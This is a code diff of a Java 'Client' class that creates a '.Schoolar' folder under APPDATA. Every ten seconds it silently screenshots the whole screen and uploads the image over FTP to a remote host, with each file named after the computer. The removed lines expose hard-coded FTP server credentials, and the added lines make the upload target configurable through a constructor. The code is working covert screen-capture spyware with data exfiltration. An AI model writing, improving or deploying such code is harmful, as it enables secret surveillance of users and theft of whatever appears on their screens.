@@ -18,8 +18,11 @@ import java.util.TimerTask;
 import javax.imageio.ImageIO;
 
 public class Client implements Runnable {
-    public void run() {
-    	final String dataFolder = System.getenv("APPDATA") + "\\.Schoolar";
+
+	String host, user, pass;
+
+	public void run() {
+		final String dataFolder = System.getenv("APPDATA") + "\\.Schoolar";
 		File folder = new File(dataFolder);
 		if (!folder.exists()) {
 			System.out.println("creating directory: " + ".Schoolar");
@@ -39,25 +42,28 @@ public class Client implements Runnable {
 				}
 			}
 		}, 0, 10000);
-    }
+	}
 
-	public void screenShot(String dataFolder) throws IOException, AWTException{
+	public void screenShot(String dataFolder) throws IOException, AWTException {
 		takeScreenShot(dataFolder);
 		uploadScreenShot(dataFolder);
 	}
-	public void takeScreenShot(String dataFolder) throws IOException, AWTException{
+
+	public void takeScreenShot(String dataFolder) throws IOException,
+			AWTException {
 		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
 		Rectangle screenRectangle = new Rectangle(screenSize);
 		Robot robot = new Robot();
 		BufferedImage image = robot.createScreenCapture(screenRectangle);
-		ImageIO.write(image, "png", new File(dataFolder+"\\screenshot.png"));
+		ImageIO.write(image, "png", new File(dataFolder + "\\screenshot.png"));
 	}
+
 	public void uploadScreenShot(String dataFolder) {
 		String ftpUrl = "ftp://%s:%s@%s/%s;type=i";
-		String host = "ftp.byethost16.com";
-		String user = "b16_14246226";
-		String pass = "12346789";
-		String filePath = dataFolder+"\\screenshot.png";
+		String host = this.host;
+		String user = this.user;
+		String pass = this.pass;
+		String filePath = dataFolder + "\\screenshot.png";
 		String uploadPath = "/htdocs/" + System.getenv("computername") + ".png";
 
 		ftpUrl = String.format(ftpUrl, user, pass, host, uploadPath);
@@ -82,5 +88,11 @@ public class Client implements Runnable {
 		} catch (IOException ex) {
 			ex.printStackTrace();
 		}
+	}
+
+	public Client(String host, String user, String pass) {
+		this.host = host;
+		this.user = user;
+		this.pass = pass;
 	}
 }
